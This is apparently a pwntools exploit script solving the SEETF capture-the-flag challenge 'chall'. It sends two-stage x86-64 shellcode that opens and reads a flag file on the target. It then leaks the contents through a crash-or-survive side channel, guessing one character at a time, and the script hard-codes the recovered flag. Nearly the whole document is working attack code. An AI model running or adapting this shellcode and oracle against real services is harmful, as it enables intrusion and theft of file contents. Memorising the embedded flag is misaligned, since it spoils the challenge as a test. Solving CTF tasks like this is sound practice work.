#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *


context.terminal = ["tmux", "neww"]
context.binary = ELF("./chall")

# first stage
sc1 = asm("""
mov esi, edx
xor edi, edi
syscall
""")

# second stage
sc2 = b"\x90" * len(sc1) + asm("""
mov rbx, 0x67616c662f
push rbx
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 0x2
syscall

mov rdi, rax
mov rsi, 0x1337500
mov rdx, 0x100
mov rax, 0
syscall

xor r8, r8
jmp loop2

loop:
inc r8

loop2:
mov rax, 0
mov rdi, 0
mov rsi, 0x1337900
add rsi, r8
mov rdx, 0x2
syscall

mov al, [0x1337900+r8]
mov bl, [0x1337500+r8]
cmp al, bl
je loop

crash:
xor rax, rax
mov byte [rax], al
""")


charset = "{_}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@$"
ptr = -1
known = "SEE{n1c3_sh3llc0ding_d6e25f87c7ebeef6e80df23d32c42d00}"
known = "SEE{"

with log.progress("enumerating") as pro:
    while known[-1] != "}":

        ptr += 1
        if ptr == len(charset):
            ptr = 0

        with context.quiet:
            # p = remote("win.the.seetf.sg", 2002)
            p = remote("localhost", 1337)

        p.send(sc1)
        sleep(0.05)
        p.send(sc2)

        for i in known:
            p.sendline(i.encode())

        p.clean()
        p.sendline(charset[ptr].encode())
        pro.status(known + charset[ptr])

        try:
            p.recv(timeout=0.05)
            p.recv(timeout=0.05)
            p.recv(timeout=0.05)
            known += charset[ptr]
        except EOFError:
            pass
        with context.quiet:
            p.close()

log.success(known)
